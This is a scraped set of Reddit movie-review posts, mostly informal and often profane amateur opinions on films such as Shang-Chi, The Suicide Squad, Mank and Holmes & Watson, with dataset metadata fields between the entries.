It was... a breathtaking film. The visuals were truly stunning. The fight scenes since are probably the best since... well... ever.  **Definitely some of the best ever**.  Yep.  There has never really been a more perfectly blended confluence of factors so masterfully and artfully merged the; choreography, computer graphics, editing, wire work, martial arts, camera work, and budget as perfectly as in the film *Shang-Chi and the Legend of the Ten Rings.*   It has this artistic beauty and feeling of a martial arts Epic from the East... all the while with a definite Western swagger, along with a crisp big budget action-movie execution and a very good-times vibe.  I really felt like I was along for the ride, and like I was there for the adventure...  I haven't felt that way from a movie since I was around 3rd grade, watching *The Neverending Story.  (That's meant as high praise for anyone unfamiliar.)*   

I watched *Shang-Chi and the Legend of the Ten Rings* in the theater with my brother and during just about every fight scene we were totally blown away!  Almost the whole movie, we exchanged excited looks of genuine surprise and how amazing the fight scenes... and how amazing the movie was... and I honestly probably let a few ""Holy $&%@'s"" slip out a few times during the showing... whoops, my bad.  But seriously, in terms choreography, style, and execution, the fight scenes are on the level of some of the best ever.  

*Shang-Chi and the Legend of the Ten Rings* is perfect... in a sense.  It exists as the perfect version of the film it was trying to create.  If you don't particularly enjoy this film, I would wager a guess that you probably don't like this genre of film, which again, is kind of  a mashup up genres of a Chinese Kung Fu/Martial Arts Epic with Marvel 'gotta save the world from disaster' heroic adventure vibe.   So that's what I'm saying when I say it's perfect.  If you are looking for a fun, immersive action movie with some of the most incredible and memorable fight scenes and action sequences you'll ever see... and you want to have a childish grin on your face as you experience the really fun adventure that is this film... then go see *Shang-Chi and the Legend of the Ten Rings,* because it IS that movie... perfectly. 

In conclusion, It's hands down the best Marvel movie to date. 

* Two thumbs up.  
* Five Stars.  
* 10 out of 10.
*   ""Triumphant.""
*  ""A Story for the Ages.""  
* Bullet Points
* Lots of Bullet Points

Ok seriously though, this movie is freakin awesome, and if you like or appreciate excellent fight sequences, do yourself a favor and see this movie in the theater.  I plan on watching again soon in the theater.  I don't write reviews for movies because I just don't care that much... but this one was so good... like seriously, they need to make more of this... that's why I'm writing the review because this is the pinnacle of what action/marvel movies could be.  I still can't  hardly believe how amazing it was!  (Seriously, if anyone wants to discuss a spoiler filled conversation or post  of the specific fight scenes, and break down and discuss some of the action sequences, I'm dying to talk more about them.   Or if there is a post already discussing them somewhere, let me know... seriously that first fight scene!!!! OMG!!!! )",moviereviews,3333,581,139,0
1630355304.0,"Bob Ross: Happy Accidents, Betrayal and Greed (2021)","Like many documentaries about universally loved figures, Bob Ross: Happy Accidents, Betrayal and Greed is pleasant and informative without being particularly daring. Viewers will learn some juicy bits about Ross' personal life and there is light artistic expression in the film, yet overall, the documentary feels rather safe. The stylistic feel is gentle and warm, much like Bob Ross himself, which can't be faulted since it is very fitting. However, the film lacks a distinct vision that would make it truly memorable.

The story has drama as it gets into the ugly posthumous battle for the rights to Bob Ross' name and image. We get to see plenty of emotion out of Bob's son, Steve Ross, as he discusses past frictions with his father, mourning his father's death, and engaging in said legal battles. Furthermore, the editing of the documentary is energetic enough to counter the dry nature of documentaries. Still, the film is lacking the artistic or emotional bite that leaves lasting impressions. So, while there are definitely small treasures to get from this movie, Bob Ross: Happy Accidents, Betrayal and Greed will likely be mildly enjoyed and largely forgotten by most viewers.

**The Green Knight (2021)**

Poetry in motion, The Green Knight is true artistry on all levels. Though very dense and sometimes too cryptic for the general viewer, it cannot be denied that this film has a definitive voice. With style that is wholly immersive and unwavering messages, The Green Knight reaches into the depths of the human experience that are both frightening and oddly serene. Ideas of mortality, purpose, and nature are just a few themes woven into the fabric of this seamless tapestry. Meanwhile, every frame is a painting, making The Green Knight a visual pleasure. 

David Lowery's carefully crafted, surreal masterpiece is driven by its striking imagery, ominous score, and mesmerizing production design. Yet, it is Dev Patel's performance which brings the subtleties of our protagonist, Gawain, to agonizing life and elevates this film to a level of lasting familiarity. In the end, The Green Knight is a rich experience that will challenge our existential views and leave a haunting impression.

**Old (2021)**

Much like M. Night Shyamalan's career, Old is a real mixed bag. This movie was fairly hard to evaluate because in almost every way, there are aspects to appreciate and aspects to condemn. The core premise of the film is a good example of this because while it serves as an enticing spark to generate initial intrigue, the story eventually devolves into a pacing and tonal mess that ultimately leaves the viewer dazed and unsatisfied. Meanwhile, the cinematography stands out for being rather inconsistent as well. Some shots are quite beautiful, while other shots seem like they lost control of the camera. 

I could go on and on. From the acting to the visual effects, there were moments of delight and disaster. Rufus Sewell delivers a striking performance while Vicky Krieps comes across more wooden. Overall, Old possesses a few too many flaws to land as a genuine success. While there is enough here to give audience members sporadic hope, the film's end result will leave viewers pondering what could have been rather than reveling in what was provided.

**Mank (2020)**

Mank is a technical symphony and a bit up its own ass, making it an ideal film for film buffs. Set in the heart of Hollywood's golden age, Mank tells the origin story of the iconic film, Citizen Kane. For a cinephile, that is already cause of intrigue, but director darling David Fincher at the helm makes it a perfect storm. Fincher pulls out every 1930s trick in the book to immerse his audience in the time period. The elegant score, classic fades and stark lighting all contribute to this expert homage. On top of that, Fincher's trademark methodical camera movement is artful and precise without calling attention to itself.

Only Fincher could tell such an understated story in such an intentionally dry way and have it land with absolute poise. Throw in Gary Oldman's razor-sharp performance to build around and we have ourselves a rock solid production. In general, Mank may not be a blockbuster that will have the masses raving; it is, however, a sophisticated commemoration that will fascinate experienced viewers.

1628369604.0,The Suicide Squad Review,"Welcome to hell—a.k.a. Belle Reve, the prison with the highest mortality rate in the US of A. Where the worst Super-Villains are kept and where they will do anything to get out—even join the super-secret, super-shady Task Force X. Today’s do-or-die assignment? Assemble a collection of cons, including Bloodsport, Peacemaker, Captain Boomerang, Ratcatcher 2, Savant, King Shark, Blackguard, Javelin and everyone’s favorite psycho, Harley Quinn. Then arm them heavily and drop them (literally) on the remote, enemy-infused island of Corto Maltese. Trekking through a jungle teeming with militant adversaries and guerrilla forces at every turn, the Squad is on a search-and-destroy mission with only Colonel Rick Flag on the ground to make them behave…and Amanda Waller’s government techies in their ears, tracking their every movement. 

## The Good:

Right off the bat, the strongest positive for The Suicide Squad will be its slap stick comedy. The reason why it works so well in this film is because the tone is set and remains mostly consistent all the way through. There were several laugh out loud moments thanks to some of the ridiculously funny situations the characters are put through. Actually, much of the comedy comes from the characters themselves and their deaths. Some characters die in such laughable ways that you can’t help but to chuckle at how absurd things end up.

James Gunn created a fun, relatable, and interesting group of characters that become the driving force and hook for the film. Idris Elba’s “Bloodsport” fills in nicely into the role of the reluctant leader with a heart. Not to mention, once you see how deadly he is with his arsenal, you’ll appreciate him even more. He does a great job in being the lead for the film. Margot Robbie’s “Harley Quinn” has a number of scenes that continue to drive home the eccentric, wacky nature that makes the character entertaining. John Cena’s “Peacemaker” was hysterical thanks to a combination of good writing and his straight-faced acting. My personal favorite may have been Sylvester Stallone’s “King Shark”. While I do think he would’ve benefited by having less lines, he still manages to have some of the more memorable scenes.

One thing that was unexpected was how Gunn found a way to craft out some sincere drama in the midst of all the goofy stuff that happens. Some of the characters have a moment of levity that immediately makes them far more relatable. You forget about their super abilities and remember that they’re human too. (Except for King Shark)

Next up, The Suicide Squad is chock full of violence and riveting action scenes. This film spared no expense in letting the bullets fly and bombs explode. As you can expect, the blood and gore are also at an all-time high for a typical superhero movie. For example, the “rescue mission” was just brutal and savage. Despite it all, The Suicide Squad still finds a way to make that entire sequence amusing.

James Gunn’s direction was certainly a plus for this movie especially when it came to editing. What I appreciated the most was how the timing of some scenes, and their placement affect the tension of the film. Many of the surprises in the film come about thanks to some quick jump cuts or different transitions. In addition to that, the cinematography was a great compliment to really enhance the zany action scenes. The slow motion comes in at the right moment, and the camera angles keep you engaged with every fight scene. Despite being a bit over two hours, the editing doesn’t make The Suicide Squad drag at all.

## The Bad:

I only had two minor issues with The Suicide Squad. One of them being that the film got a little too extra at times. Obviously, this is an incredibly subjective critique, but I thought it was funny enough without having to do things like add scenes with animation, for example. While it may have been consistent with the character I’m alluding to, I just didn’t think it was really necessary. Again, a minor issue, but not a deal breaker at all for the film.

The only other issue I had was the treatment of Viola Davis’ character, Amanda Waller. I thought that her role became a victim of the comedy a bit too much and it undermined her character. Given how ruthless and intimidating her character is portrayed, I didn’t really care for some other scenes that seem to flip that notion on its head. I understand that it worked for the story, but I think that could’ve been tweaked a bit to maintain her menacing presence.

## The Verdict:

The Suicide Squad is bloody fun ride with a lovable cast to match. This is clearly a win for Warner Bros and DC Comics. I should emphasize that it’s not a win because James Gunn tapped into that “Marvel Fun” factor. It was a win because it crafted a unique lane for its characters and stuck with it. The Suicide Squad doesn’t try to be dark, just for the sake of being dark. It’s essentially an action comedy for mature audiences.

The Suicide Squad is a stand alone film, so you do not need to watch the previous Suicide Squad movie at all. This has no connection to it even if it does reuse some of the characters. This film is unquestionably better than Suicide Squad (2016) and it’s arguably one of Warner Bros best DC films to date. If you’re a DC fan, and if you’re a fan of the Amazon Prime show, The Boys, then The Suicide Squad will be something you’ll want to watch. Be advised that this film is also rated R for a reason. There’s graphic violence, full frontal nudity, and so on. Nevertheless, be sure to check out The Suicide Squad when you get the chance.

It was too candy-coated for me and it lost me with the pacing, dialogue, and having no likable characters besides Josh. The first ~15-20min felt more like it was ripping off Scream as apposed to paying homage, which was off putting. Also it did not feel like the 90s…

The movie falls into a weird spot because it is Rated R but was made for a 13-15 year old audience… while trying to grab the book series fans who grew up in the 80s/90s. I wonder if I had grown up with the books if I would have gotten more out of it. 

I’m very happy for all of the people that had fun with it though! Will return for the sequel.

1616553876.0,Lazarus (2021),"The good: The movie has an excellent concept for an action/hero film. Sean Riggs(Ray Lazarus) is believable and strangely good as the main character: strangely, because so much of the rest of the acting (or maybe the writing) is so profoundly bad. No, I take that back. If Vin Diesel and Keanu Reeves are allowed to lead action franchises with top billing, Sean Riggs should be given the gold star for his performance in this film. 

If you're just out to watch a quick-and-dirty film where people get hit a lot, Lazarus has that. Along with some very eye catching set design and decent sfx. The set and wardrobe designers clearly took financial setbacks as artistic opportunities and it shows: no money to build an entire apartment on your warehouse set? Just hang a bunch of windows as decorations and play it off like an artistic uptown loft. Honestly, kudos.  

The bad: Let's start with the run time. While it's true that we have gotten some longer hero movies recently, it's also true that most people didn't like them. For a movie that starts in the middle of the plot and tells us almost nothing about the character, 1 hour and 50 minutes feels.... a bit obnoxious. Action films aren't exactly known for their acting, but the main characters are usually at least able to create some sort of instant emotion in the viewer. This film confusingly turns a mentor into a bad guy, and makes the bad guy so sympathetic that you kinda wonder why he kills people.

The funny : Lines obviously written for a woman speaking English as a second language are delivered in the MOST American Monotone ever. If you can, imagine Carrie Bradshaw saying ""My good brother, I lie awake at night thinking of the pain this causes you."" You can't make this up.

The redeemer: The guy has a really cool power. And if the film spent more time on his back story and character arc instead of having a weird sidekick with strange sexual energy following him around to continually pad the run time with descriptions of his power, this would be actually be... Pretty amazing (I'm as shocked as you are)

.... But it does. It's like watching some coked out version of Teen Titans where Beast Boy continually pops up to go ""Hey Robin, you ha..... ve no powers"" that's a bad example ""Hey Starfire you can float... Don't forget to float"" and ""hrnnnnrrghhgaaah when you float.....hfrrrgghhnnnrrhhhaaa I need a cigarette""

It's weird. It's just weird.

What the don't?

The film claims to be based on the novel ""the man who fell to earth"" but honestly, it's more like Black Lightning, Blade and Spawn had an illicit love child. Which is totally fine. But own it.

TL;DR Should you watch this?

 If you enjoy action/hero films, you've already seen them all, and the boys did nothing for you... . If you love seeing what can be done on a less than high budget.... If you sat through the entire fast and furious franchise without any part of your brain going numb... if you like watching people get hit by other people... If you're jonesing so hard for hero films that you might accidentally watch DC's ""The Losers"" Yes.... And in the case of that last one... Please. 

If you're a hero film snob who washes your caviar down with Evian wine (aged 100 years) while watching Black Panther, Guardians of the Galaxy, and the Avengers Franchise in an endless loop (no judgement) probably not.",moviereviews,3355,593,130,0

1613523303.0,Day 4: Rat Race,"So basically here's my back story, I havent watched many movies in my life, so I decided since lockdown hit I'll watch one movie everyday and review it on reddit kind of blog style, I will try to do this daily with exception

Decided to go back to a childhood favourite of mine for today and it failed to dissapoint me. I don't where to start with this movie I genuinely think it is a cinematic masterpiece.

The story is as follows 6 completely different characters are competing in a race for 2 million dollars while some rich guys are placing bets on them, all the characters are different and have different stories without it feeling like there's one main character, the characters are as follow

Nick:wants nothing to do with it at first but when he gets the perfect opportunity to win he joins the race, this all happens when he meets Tracy, the two fall in love with each other after Tracy catches her boyfriend cheating and this gives them determination to win and split the money

Vena and merill:at the start these act as a kind of Ying and yang to each other but slowly develop into the same person, Vera being just a regular old lady trying to make the world a better place while merill is a buisnesswoman using her contacts to get her closer to that treasure

Owen:after making a bad decision as a football referee the whole world is against him trying to hold him back but he still persists, he got dealt a really shitty hand and made do with it

Duane and blaine.:obviously the most desperate of the 6 this duo will bend or break the rules in anyway for them to secure the bag, but no matter what they do it never works out

Randy:randy is forced into bring his family with him who constantly want to make pit stops, visit different landmarks and just generally do what a family would do on a road trip, also the scene where it looked like he was giving a Hitler speech was comedy gold

Nico:nico was the comic relief played by the same actor who graced us with Mr bean, nico just runs around saying ""it's a race"" and ""I'm gonna win* he also randomly falls asleep everywhere

The only negative is the start credits took 3 minutes

I vcant see anything this movie could've done better I want to give it a 10 but that would make people mad so

1606871106.0,Embattled - An Unexpectedly Great Movie,"As a big MMA fan, I originally thought this movie was going to be an embarrassment to the community and just plain horrible. I was so wrong.

Stephen Dorff pulled off a great performance. He was extremely convincing as the enigmatic self absorbed star of the movie. He also clearly put in a lot of work in regards to jiu jitsu and mixed martial arts.

However, for as great as Dorff was, he was almost outperformed by Derren Mann, the young star who plays his son. He was composed and believable in every scene.

This movie was sadly released at a terrible time with HORRIBLE PR. It was advertised in a terrible way. The trailer did not show the dynamics of the movie well enough imo.

If you haven't watched it yet, I highly recommend it. If you need another opinion, this review is pretty good and hits on all the points.

1606666779.0,A Quick Review of 'Never Rarely Sometimes Always' (2020),"Have you seen Never Rarely Sometimes Always? Let me know if you have and comment your thoughts below!

Heard about this film for months and finally got around to watching Eliza Hittman's critically-acclaimed drama. If you haven't heard, the film's subject matter is abortion, and also the dangers of being a teenage girl in the unforgiving world. Overall, I think it's an incredibly sensitive take on a very controversial topic. There are 3 main reasons for this: the acting, the cinematography, and the messaging. 

The lead is played by Sidney Flanigan whose performance is simply outstanding. She doesn't say much throughout the film but you can feel her fear, uncertainty, and apprehension seep through the frame in almost every scene. The supporting cast led by Talia Ryder is also strong, but it is Flanigan who carries the emotional weight of the show on her young shoulders, and there is one much-talked-about scene towards the end that epitomises this fact. 

The cinematography focuses a lot on closeups and shallow depth of field, indicating that this is a very intimate and personal film, and also represents the characters feelings of being boxed in and isolated from the city and the world around them in general. It's handled very well and makes for some absolutely gorgeous and dreamy shots despite the characters struggling to achieve their objective. 

Lastly, I have to say that I was afraid this film would be preachy, given its subject matter. And it's not. At least, not to me. It doesn't explicitly shout out that abortion is good or bad, but just tells the story of one person's actions and the emotional trauma some people have to go through. It focuses on the what, rather than the why. And some people will absolutely hate that. I think it's actually the best way this film could have been made, and is in many ways a successful balancing act between honesty and compassion. There will definitely be people who will dislike the film for its ending and the character's actions, but I for one think it's one of the best films of 2020.",moviereviews,2059,352,50,0

brief preview

 

Steve fucking Buschemi deserves a Oscar for his work here. I mean he was able to get some laughs out of this awful script. Once its revealed he isnt actually a werewolf that's when he starts to shine. Especially in the final scene. Between him licking himself and him delivering the best line of the movie. I don’t remember what that line exactly is because I have already deleted this crapfest of a movie from my mind. Still though he was the highlight of this movie.

Bonus for the few other laughs: Kennan Thompson wasn’t used much but he has a few laughs. Again in the end scene he has decent lines, that at least get you to smile. Shaq is ok in his brief cameo as well. 

Now lets get to all that is wrong here which is basically the whole movie. 

Adam Sandler: Has any of his stupid voices been funny since *The Waterboy*? That may be the last time his silly voice was actually funny. The king of terrible voice accents strikes again here. I don’t know who’s idea it was to make him slightly retarded here but they need to stop making movies or produce any ideas for movies. Just have Sandler play himself and he can pull of the idiot role on his own.The voice he does here instantaneously make you regret even putting that unfunny movie one.

I watched this movie without seeing the trailer nor reading about the plot (I try to do that with most movies so my expectations wont cloud my judgment). In this particular movie Im glad I did because everything was outstanding : actors, music, clothing, colors, cinematography, maybe the ending was a bit off yet the development of the movie (the dedication) its something you dont see that often in a horror movie and Im so glad Gerard Bush and Christopher Renz (directors) did, dropping hints of what was really going on in this movie.

Also, Antebellum is a perfect example to make you think about the past , making you realize how horrible white people treated other people because of their skin tone, how white people raped, mistreated and abused women and even shows (in the movie) how now-a-days (in a ""subtle"" way) people prioritize others  because of the color of their skin.",moviereviews,1030,178,17,0

&#x200B;



\[ Movie Spoiler\]

Early throughout the movie I realized that Jake was connected to the janitor somehow due to all the parallel movie shots. When he mentions ""sometimes I see kids who were in past productions"" thats a clear hint that he´s actually the janitor. Moments before that, he mentions a poet that wrote a series of poems to a woman names Lucy which the girl next to him replies ""Like me"" being the first time the audience know who she is...or do we?

Jakes says that  she was a beautiful idealized woman and thats what this character next to him is, just a pigment of his imagination. Thats the reason why her career, work place, name and clothes keeps changing every now and then.  He keeps imagining what things could have been if he had the courage to talk to her in that trivia night. The sad thing is...Even her ""idealized woman"" is planning on leaving him and ""ending things"" with him. 

The audience could feel represented /identified with some aspects of this character like the regret of not doing something when you had the chance and now the only thing left is thinking what things could have been if you did. This movie makes you think about your life. Are you happy with it or would you change it? Do you have any regret?

The ending in this movie is quite sad because it shows that not everone has a happy ending and 'acceptance' is the only way to deal with some things or even life.  

\[Book Spoiler\] Finally, the question that was never presented in the movie is ""What are you waiting for?"" (Final question) which leads to suicide, in the book he actually commits suicide. Charlie Kaufman decided to go with something else....Late in the movie Lucy asks ""How long does it take to get hypothermia?"" being a certain foreshadowing to Jake´s death by taking all his clothes in the freezing car and the final movie shot of his car covered in snow showing that he never left.",moviereviews,2298,412,51,0

1599488077.0,Don't Look Under the Bed (1999),"I love this movie. They surely do not make these DCOMs like they used to. The acting by Ty Hodges was actually really great, especially for this type of character, and I have no idea why he didn't end up in more stuff.

The plot is actually good and has substance which is something I feel like has been seriously lacking in modern children shows/movies. I enjoy the theme of growing up too fast and that just because you're an adult does not mean you magically have all of the answers. This movie has a clear message that you are supposed to grow up and not skip ahead into maturity, so that way you can take the lessons you've learned in your childhood to better prepare for adult problems. Specifically, facing your fears and learning how to deal with situations that are out of your control, such as a loved one developing cancer.

Besides the writing and story, the makeup, effects, and sets were great! The Boogyman was actually terrifying. The boogy-world looked great and how you'd probably imagine a whole other universe existing under your bed would look like.

There are some great drinking rules for this movie too.  
1) Drink every time an inanimate object turns its head.  
2) Drink every time you spot a tiger on the screen.

1598304322.0,A Place In The Sun (1951) * * * * (Great movie),"This one movie sure caught me off guard. Thinking about how it is was going to be a lovey dovey romantic movie, just like the ones they frequently play on TCM. I was like “holy crap!” I knew I should’ve done my research before sitting down and watching this. The dark tone of the movie was a nice surprise 

The movie stars the the legendary Elizabeth Taylor , the super talented Montgomery Cliff , Shelly Winters. Directed by the great George Stevens. 


The movie is about this guy who starts working in his richs uncles factory where he starts dating and falls in love with  Alice (Shelly Winters) one of his coworkers.  Getting a promotion at work he gets invited to a Rich’s people party this is where he meets the good looking Angela (played by Elizabeth Taylor) and they instantly fall in love with each other. Now wanting to get rid of Alice. This is where the movie takers a darker tone. 


Sometimes what you think could get you in trouble even if you don’t act out on it.  I guess that’s the lesson of the story 

The movie is based on the novel “An American Tragedy” by Theodore Dreiser.  George Stevens did a superb job translating into the screen the cinematography was so excellent as well.  One of Elizabeth Taylor better films that I have seen so far. 


If given the opportunity to see this. I say to take it. Such a great movie streaming on Amazon Prime",moviereviews,1372,250,19,0

1595854155.0,The Mummy (1959)...this movie is rad,"This movie is fucking rad and should be watched. 

I have been wanting to dive into the classic Universal and Hammer production monster movies and I have decided to start with *The Mummy* for show-related reasons. The 1932 version was ok, didn’t do a whole lot for me, but this 1959 rendition inspired me. 

Peter Cushing and Christopher Lee were great! Lee’s portrayal as The Mummy was honestly terrifying. Standing at 6’5’’, his stagger walk was exaggerated and he was practically a terminator. He walked through windows, busted through doors, bullets couldn’t stop him, and he was a silent killer like Michael Myers. The best kill of the movie was when he **BROKE A MAN’S BACK OVER HIS KNEE. Fucking rad.** I also **greatly** appreciated that they actually addressed the main dilemma of archeological digs: the desecration of historical sites. It’s a common thread in all of these mummy movies. (I know most professional digs are done in a good way...right?). 

I will say that this movie could have improved with a very slight screenplay change. They showed who was summoning and controlling The Mummy the whole time. I think it would have been more terrifying if they left that as a mystery. The plot would had focused more on Peter Cushing’s character and would lead to bigger jump scares and add a slight whodunnit (who-summonit) element. 

This movie rules and is a lot of fun.",moviereviews,1385,236,28,0

1593697082.0,Holmes & Watson: As bad as you think,"What a absolute swing and miss of epic proportions. This is one of the worst comedies and movie in general that I have ever seen. Which is a shame because it had so much potential. You would figure that one of the writers behind *Idiocracy, Tropic Thunder,* and *Men in Black 3,* and the combo of the once genius John C Reilly and Will Ferrell, would at least be decent. But this movie is a far cry decent. Hell I would even take this movie being just bad. Instead this fucking 90 car pile that somehow just keeps getting worse with each passing minute. One of the few good things I guess is that this movie is in fact only 90 minutes. Its still a real tough 90 minutes to suffer through though. The urge to turn this off after 10 minutes was strong but im a idiot so I sat through this fucking shitfest of a movie. As much of a train wreck as this movie is, there was at least one good thing in it.All fucking hail John C Reilly. He is the only reason that I even remotely smiled during this movie. Not even he could make this shit script funny but he at least tried. This man deserves a award for even getting a smile because it was fucking miracle for that accomplishment. I wish I could say the same for Will Ferrell

I don’t know what happened to this man but man was he fucking unfunny in this. Between his over the top facial expressions and basically everything else he offers here, he is the just one of the many reasons of this movie being unwatchable. I cant tell if his version of Sherlock is a raging moron or actually smart. So much shit that he does seems like the actions of a idiot rather than some sort of master detective. I cant give specific examples because I have already begun the process to delete this movie from my memory. Apparently Sasha Baron Cohen was supposed to star in this instead of him and man that would have been so much better. Again this movie would still be bad because of the atrocious script but it wouldnt be this level of awful.

Now the real reason for this movie being the worst is Ethan Cohen. He wrote and directed this dumpster fire of crap. I cant even describe the plot of this movie because there really isnt one. It really just moves from one unfunny joke to the next. He must have been drunk when he wrote this or he made a bet that he could make the most unfunny movie in history. A bet that he should have easily won. The “jokes” werent even good ideas they were just fucking awful and I don’t see where he thought they would be funny. Jokes such as taking selfies with the queen, how women cant be doctors or the dreadful Titanic joke he made in the end. This movie did sink faster then the Titanic though. Im well aware of how awful that joke was but its still better then Cohen’s which was how it was the safest mode of travel and a couple others about waiting for the female doctors to send letters once they get home. Oh fuck there is also a completely unfunny and unnecessary musical section. I have no idea why they put it in the movie but I wish I had that 5 minutes of my life back. He did a terrible job writing this movie and I now question how much of those other great movies did he actually have input in. 

Overall this movie is a trainwreck of a movie and its not even a fun watch. Some movies are so bad that they are fun but this one is so bad I cant fathom how any one thought that this was a good idea. There really isnt much of a difference between watching this movie and slamming your head against a wall. They both kill your brain in about the same manner. So fuck this movie don’t ever watch it. And with that now I can delete this movie from my memory. 2/10

1589716021.0,Scoob - 4/10,"The movie is... fine. For very young kids at least. This movie relies too much on easter eggs, references, nostalgia and regonizability that it leaves no room for an investive story. 
You could just call it ""ScoobFest - Story Mode"" and you would have the exact same thing.
 When the movie wants you to get emotional it will tell you to get emotional. When the movie wants you to laugh it will pause for an akward bit or would repeat the gag for way too long.
Also - Remember the trailers that said: I guess our movie's an origin story! Well... if you count the first 15 minutes as the whole movie than yes - it is an origin story.
They even gave the villain a ""funny"" name to set up a joke that only appeared in a clip released months before the movie and then it wasn't even in the movie.
Now a little bit about the story so...

SPOILERS!!! If you haven't seen the movie yet and you would like to see such a mediocer ok movie than do so before reading the next paragraf.






LEGEND: 
SDU: Scooby Doo Universe
OG: original
BF: Blue Falcon

SPOILERS: 
The story: A villain named Dick Dastardly wants to open a gate to the underworld which appearantly holds acient treasures. To do that he has to collect three GIANT dog skulls and allign them in a specific pattern at the Pantheon because Alexander the Great appearantly made a gate to the underworld and the gang together with the Blue Falcon and Dynamite (The superheros from the SDU) have to defeat him as Shaggy and Scooby undergo an ""emotional"" breakup as they learn that they can grow, but they don't need to grow apart.
At the end there's an ""epic"" fight with the three headed dog as BF has to learn to be more confident. By the way - the OG BF retired and now it's his son being the super hero.

1588835853.0,[OC] Revisiting an Animated Favourite | Batman: Under the Red Hood Movie Review [2010]," [ I've just posted a new video on my YouTube channel talking about an old favourite in a comicbook animated movie Batman: Under the Redhood. I hadn't seen it in a few years and so wanted to revisit it in order to make a video about it...  
The film itself explores the idea of what the titular comic book hero's responsibilty is when it comes to taking down villains and the morality when it comes to deciding to strictly never execute them - this idea becomes challenged by certain characters and because of that, what's right and wrong becomes a blurry grey area for Batman and the audience alike.



Under the Redhood isn't just any dumb cartoon, it actually really explores it's characters and I think it's very well done - JUST LIKE MY VIDEO aahhhhhh gotchya, now you've gotta watch it, k thanks bye.

Haha, I joke. But yeah nah, I highly appreciate the movie, I think it's got a lot to say about its own world and is a hell of a lot smarter than what at first glance might look like it's something that's just for kids.

1588528428.0,Killing time in quarantine,"I wont lie I love that this quarantine has given me so much time to watch movies. Still wish I didn’t have two jobs to work but Im taking full advantage when I can. So here is just some quick or at least ill try to keep em quick

Extraction

All the bodies it the floor in this movie. Action wise this movie is fucking awesome. Between all the dead bodies and quick action cuts this movie rules. It certainly feels like a video game especially that cop chase scene. The fight scenes are great which is what you would expect from the dude that choreographed the fight scenes in *Avengers Endgame* and *Captain America Civil War.* The drawback though is that story wise and plot this movie sucks ass. What the fuck should I care about him getting this drug lord’s child out of harms way? Id put money down that the kid was exactly innocent in life when your dad is a major drug lord. At least in *John Wick* you root for him to murder everyone cause they killed his dog, pricks deserve everything they get for killing a dog. In this movie you don’t have a reason to root for Hemsworth other then for him to just murder everyone for violence sake. However all the bullets and fights make up for the lack of story and the wasting of David Harbour. 7.5/10

Dolemite is My Name

How in fucking tarnation did this not get a best picture nod? This was far superior to that overrated *Joker* movie. Eddie Murphy was fucking great as Dolemite. I could say that about anyone in this movie though, Wesley Snipes finally had a move that wasn’t straight to DVD, Craig Robinson, Mike Epps, Keegan Michael Key and Da'Vine Joy Randolph are all solid in supporting roles. Man I truly dont know what else to say about this movie other then its legit great. Just trust me and watch it. 9/10

The Sitter

Want to know what movie wasn’t very funny… if you guess this movie then ding fucking ding you are correct. There arent many jokes here and the characters are super annoying. Jonah Hill is not funny here and I wanted to fucking punch him in his stupid face through out this whole movie. Sam Rockwell here though is great as always. He is pretty funny as a crazed cocaine dealer. I will give credit though for one scene in particular. Hill’s character confronts one of the kids he is watching about being gay. The kid is on meds and has several anxiety things going on and this scene was a good take on being yourself and that there is nothing wrong with being gay. Outside of that surprisingly touching scene and Rockwell’s performance this movie is bad. 5/10

Good Boys

Strike number two as far as comedies go this quarantine stretch. Fuck this little boy  and they are super annoying. The laughs are few and far between. This was typical Seth Rogen and Evan Goldberg humor but this time all the dick and sex jokes fall flat. Hopefully none of these kids really have a movie career and this movie is forgotten.   I would advise against watching this. 4.5/10

Scary Stories to tell at Dark

A damn good horror movie. I wont lie I don’t remember much about it but its damn good movie. 8/10

Shrek Forever After

RIP childhood memories. As mediocre as the third one is, this one buries whatever legacy the franchise had left. The jokes are bad and don’t connect like they did in previous movies. Donkey isnt funny, Shrek and Fiona are boring ,and even the secondary characters like the gingerbread man, Pinocchio and three pigs arent funny. The only saving grace here is Puss in Boots. Him being a fat out of shape cat provides the only laughs in a otherwise dreadful movie. 3/10

Fighting with my Family

You don’t have to be into wrestling to like this film . It still has enough humor and seriousness to be a legit good movie. Everyone in this movie is good which is accomplishment for Vince Vaughan because he hasn’t had a good movie in years. The Rock is god damn electric as himself, just everyone in this movie is damn good. My main beef here is that the movie was to short. I am usually all about making movies shorter but this needed to be longer. I wanted a montage of her improving in the ring and becoming NXT champ. I don’t know why they didn’t have her being NXT champ when she won the Diva title. For non wrestling fans that was a bunch of nonsense (just like everything else I have written), for wrestling fans you know what im complaining about. 8.5/10

Green Inferno

I have determined that Eli Roth is not a good director. The man can do gore parts amazingly well. That compliment aside the rest of this movie is fucking garrbbaaagggeee. Poorly written characters and super awful acting does nothing to help make this movie bearable. I was so rooting for all these characters to die and get eaten in the worst ways possible, which Eli does deliver for the most part. That dumb scene where they got the villagers high by stuffing her body with weed was a massive insult to my highly limited intellect. Fuck Eli Roths movies the gore doesnt justify the waste of time the rest of the movie. 4.7/10

The Way Back

Ah *Coach Carter* but with a white guy instead of Samuel L fucking Jackson. What I though was gonna be a typical sports movie and follow the simple formula most sports movies take. Which is former super player its a alcoholic loser in life, now team is a bunch of losers and arent good, they struggle to get along, they eventually come together, and in the climax they fall apart to only come back together and win the tournament or whatever bullshit. And this movie starts to follow this exact pattern until the end. Ben Affleck though just cant quit the booze. So he gets kicked off the team before the playoffs. Legit though this was a surprise movie. It was much better then it had any right to be. Ben Affleck is legit fucking good in this movie. 8/10

Parks and Rec: Reunion special 

The definition of hit and miss. Some of these are fucking gems and others are swing and misses. Adam Scott looks like he did all the drugs in the world before filming this. He looks like he has been awake this whole quarantine. Amy Poehler looks like shit as well. All the plastic surgery hasn’t been kind to her. Aziz was funny as well. The Pawnee today part was awful. Dennis Feinsteins part though was perfectly sleazy and the same goes for Jamm part. Offerman was solid as Swanson which is expected. Pratt was funny but Audrey Plaza has annoyed me on this show for awhile now. Jean Ralphio was funny as well. But the real kings here are Jerry (if you don’t think he is the best part of this show then fuck off cause he is consistency the best part) and Paul Rudd as Bobby Newport are a riot. Newport being clueless to be corona lockdown is perfectly written and the same for Jerry using the filters on the phone and being clueless about it.",moviereviews,6746,1241,103,0

A lot of things went unexplained as goes with the backstory of the entire movie. There were also some corny parts of the movie relating back to the very infamous Scarface “hello to my little friend” scene.

1588185952.0,Good Time (2017) - Review," 

If you want to know what it means to be anxious, watch this movie. The tension, the acting, the suspense and the pacing will have you at the edge of your seat as you watch bad decision after bad decision being made. To put it simply, you get to feel what it is like to be truly cornered by an inescapable fate and it is an amazing ride.

